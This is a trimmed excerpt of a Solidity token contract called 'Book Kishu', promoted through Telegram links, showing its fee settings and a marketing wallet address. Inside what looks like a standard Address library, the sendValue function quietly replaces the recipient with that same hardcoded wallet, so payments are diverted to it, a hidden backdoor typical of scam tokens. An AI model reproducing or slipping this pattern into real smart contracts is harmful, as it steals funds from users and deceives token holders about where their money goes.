//Telegram: https://t.me/bookkishu
//Promoted by : https://t.me/bscsafedegens
...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0x9939449681712233a4fBBa96A7F56B07a6a78F03);
...
contract BookKishu is Context, IERC20, Ownable {
    ...
    string private constant _name = "Book Kishu"; // 
    string private constant _symbol = "BOOKKISHU"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 7;
    uint256 private _liquidityFee = 1;
    address private  _marketingWallet = 0x9939449681712233a4fBBa96A7F56B07a6a78F03;
